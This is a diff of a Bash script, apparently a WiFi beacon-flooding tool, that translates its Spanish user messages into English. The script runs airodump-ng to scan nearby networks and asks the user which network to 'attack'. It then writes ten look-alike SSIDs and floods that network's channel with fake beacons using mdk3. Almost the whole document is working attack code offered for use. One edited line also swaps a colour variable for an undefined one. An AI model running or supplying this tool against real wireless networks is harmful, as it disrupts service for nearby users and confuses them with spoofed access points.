@@ -13,7 +13,7 @@ RESET="\e[1;97m"
 trap ctrl_c INT
 stty -ctlecho
 function ctrl_c(){
-    echo -e "\n\n${RED}[!]${RESET} Saliendo..."
+    echo -e "\n\n${RED}[!]${RESET} Exit..."
     if [[ -n "$xterm_pid" && -d "/proc/$xterm_pid" ]]; then
         kill "$xterm_pid"
     fi
@@ -28,22 +28,22 @@ banner(){
     echo -e "${GREEN}┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋┏┓"
     echo -e "┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┓┃╋╋╋╋╋╋╋┏┛┗┓"
     echo -e "┃┗┛┗┳━━┳━━┳━━┳━━┳━┓┃┗┛┗┳┓┏┳━┳━┻┓┏┛"
-    echo -e "┃┏━┓┃┃━┫┏┓┃┏━┫┏┓┃┏┓┫┏━┓┃┃┃┃┏┫━━┫┃${RESET}    (Hecho por ${YELLOW}0xJuaNc4${RESET})"
+    echo -e "┃┏━┓┃┃━┫┏┓┃┏━┫┏┓┃┏┓┫┏━┓┃┃┃┃┏┫━━┫┃${RESET}    (Made by ${YELLOW}0xJuaNc4${RESET})"
     echo -e "${GREEN}┃┗━┛┃┃━┫┏┓┃┗━┫┗┛┃┃┃┃┗━┛┃┗┛┃┃┣━━┃┗┓"
     echo -e "┗━━━┻━━┻┛┗┻━━┻━━┻┛┗┻━━━┻━━┻┛┗━━┻━┛${RESET}"
     sleep 1
 }
 
-# Comprobar si están instaladas las herramientas necesarias
+# Check whether the required tools are installed
 check_tools(){
     tools=("iw" "airmon-ng" "airodump-ng" "mdk3" "xterm")
-    echo -e "\n${CYAN}[*]${RESET} Comprobando herramientas necesarias...\n"
+    echo -e "\n${CYAN}[*]${RESET} Checking tools required...\n"
     for tool in "${tools[@]}"; do
         if command -v $tool &> /dev/null; then
             echo -e "$tool....${GREEN}ok${RESET}"
         else
             echo -e "$tool....${RED}no${RESET}"
-            echo -e "\n${RED}[!]${RESET} La herramienta ${YELLOW}$tool${RESET} no se encuentra instalada en el sistema, debes instalarla para continuar\n"
+            echo -e "\n${RED}[!]${RESET} The ${YELLOW}$tool${RESET} tool is not installed on the system, you must install it to continue."
         fi
         sleep 0.5
     done
@@ -51,28 +51,28 @@ check_tools(){
 
 # List available network interfaces
 select_interface(){
-    echo -e "\n${CYAN}[*]${RESET} Comenzando...\n"
+    echo -e "\n${CYAN}[*]${RESET} Starting...\n"
     sleep 1
-    echo -e "\n${CYAN}[*]${RESET} Interfaces de red inalámbricas disponibles:\n"
+    echo -e "\n${CYAN}[*]${RESET} Wireless network interfaces available:\n"
     interfaces=$(iw dev | grep Interface | awk '{print $2}')
     counter=1
     for interface in $interfaces; do
         echo -e "${YELLOW}${counter}.${RESET} ${interface}"
         ((counter++))
     done
-    echo -n -e "\n${CYAN}Selecciona la interfaz con la que deseas trabajar >${RESET} "
+    echo -n -e "\n${CYAN}Select the interface you want to work with >${RESET} "
     read interface
     if ! ifconfig "${interface}" &> /dev/null; then
-        echo -e "\n\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no es válida\n"
+        echo -e "\n\n${RED}[!]${RESET} The interface ${YELLOW}$interface${RESET} is invalid\n"
         exit 1
     else
-        echo -e "\n\n${CYAN}[*]${RESET} Comprobando modo monitor en ${YELLOW}$interface${RESET}\n"
+        echo -e "\n\n${CYAN}[*]${RESET} Checking monitor mode in ${YELLOW}$interface${RESET}\n"
         sleep 1
         if ! iwconfig $interface | grep "Mode:Monitor" &> /dev/null; then
-            echo -e "\n${RED}[!]${RESET} La interfaz ${YELLOW}$interface${RESET} no se encuentra en modo monitor, activalo para continuar...\n"
+            echo -e "\n${RED}[!]${RESET} The ${YELLOW}$interface${RESET} interface is not in monitor mode, activate it to continue....\n"
             exit 1
         else
-            echo -e "\n${GREEN}[*]${RESET} Modo monitor activado en ${YELLOW}$interface${RESET}, continuando...\n"
+            echo -e "\n${GREEN}[*]${RESET} Monitor mode activated in ${YELLOW}$interface${RESET}, continuing...\n"
         fi
     fi
 }
@@ -81,7 +81,7 @@ select_interface(){
 show_table(){
     clear
     banner
-    echo -e "\n${CYAN}Redes disponibles:${RESET}\n"
+    echo -e "\n${CYAN}Available networks:${RESET}\n"
     echo -e "--------------------------------------------------------------"
     echo -e "| BSSID              | ESSID               | Canal | Potencia |"
     echo -e "--------------------------------------------------------------"
@@ -96,30 +96,30 @@ show_table(){
 
 # Scanning WIFI networks
 net_scan(){
-    echo -n -e "\n${CYAN}¿Deseas continuar con el escaneo de redes? ${YELLOW}(s/n)${RESET} >${RESET} "
+    echo -n -e "\n${CYAN}Do you wish to continue with the network scan? ${YELLOW}(s/n)${RESET} >${RESET} "
     read option_choose
     if [[ "${option_choose,,}" == "s" ]]; then
-        echo -e "\n\n${GREEN}[*]${RESET} Iniciando el escaneo de redes...\n"
+        echo -e "\n\n${GREEN}[*]${RESET} Starting the network scan...\n"
         sleep 1
         clear
         banner
-        echo -e "\n${YELLOW}[*]${RESET} Escaneo de redes en curso...\n"
+        echo -e "\n${YELLOW}[*]${RESET} Network scanning in progress...\n"
         xterm -geometry 120x40 -e "airodump-ng ${interface} --output-format csv -w output"
         xterm_pid=$!
         wait "$xterm_pid"
         show_table
-        echo -n -e "\n${CYAN}Escribe el nombre de la red WiFi a la que quieres atacar >${RESET} "
+        echo -n -e "\n${CYAN}Type the name of the WiFi network you want to attack >${RESET} "
         read selected_essid
         if grep -q "$selected_essid" output-01.csv; then
-            echo -e "\n${GREEN}[*]${RESET} La red ${YELLOW}$selected_essid${RESET} ha sido seleccionada.${RESET}\n"
+            echo -e "\n${GREEN}[*]${RESET} The ${YELLOW}$selected_essid${RESET} network has been selected.${RESET}\n"
             sleep 0.5
         else
-            echo -e "\n${RED}[!]${RESET} La red ${YELLOW}$selected_essid${RESET} no se encuentra en la lista.${RESET}\n"
-            echo -e "\n${RED}[!] Saliendo...${RESET}"
+            echo -e "\n${RED}[!]${RESET} Network ${YELLOW}$selected_essid${RESET} is not in the list.${RESET}\n"
+            echo -e "\n${RED}[!] Exit...${RESET}"
             exit 1 
         fi
     else
-        echo -e "\n\n${RED}[!] Saliendo...${RESET}"
+        echo -e "\n\n${RED}[!] Exit...${RESET}"
         exit 0
     fi
 }
@@ -127,15 +127,15 @@ net_scan(){
 # Perform Beacon Flooding attack
 beacon_attack(){
     selected_channel=$(grep "$selected_essid" output-01.csv | awk -F "," '{print $4}')
-    echo -e "\n${CYAN}[*]${RESET} Creando diccionario de ataque para la red ${YELLOW}$selected_essid${RESET}\n"
+    echo -e "\n${CYAN}[*]${RESET} Creating attack dictionary for the network ${YELLOW}$selected_essid${RESET}\n"
     for i in $(seq 1 10); do
         echo "${selected_essid}${i}" >> ssid_dict.txt
     done
     sleep 1
-    echo -e "\n${GREEN}[*]${RESET} Diccionario creado con exito!\n"
+    echo -e "\n${GREEN}[*]${RESET} Dictionary created successfully!\n"
     clear
     banner
-    echo -e "\n${CYAN}[*]${RESET} Ataque en curso a la red ${YELLOW}${selected_essid}${RESET} ${RED}(Ctrl + C para finalizar)...${RESET}\n"
+    echo -e "\n${CYAN}[*]${RESET} Attacks in progress on the network ${YELLOW}${selected_essid}${RESET} ${NETWORK}(Ctrl + C to end)...${RESET}\n"
     mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
 }
 
@@ -147,6 +147,6 @@ if [ "$(id -u)" == "0" ]; then
     net_scan
     beacon_attack
 else
-    echo -e "\n${RED}[!]${RESET} Se requieren permisos de superusuario ${RED}(root)${RESET} para ejecutar el script\n"
+    echo -e "\n${RED}[!]${RESET} Superuser permissions ${RED}(root)${RESET} are required to run the script\n"
     exit 1
 fi
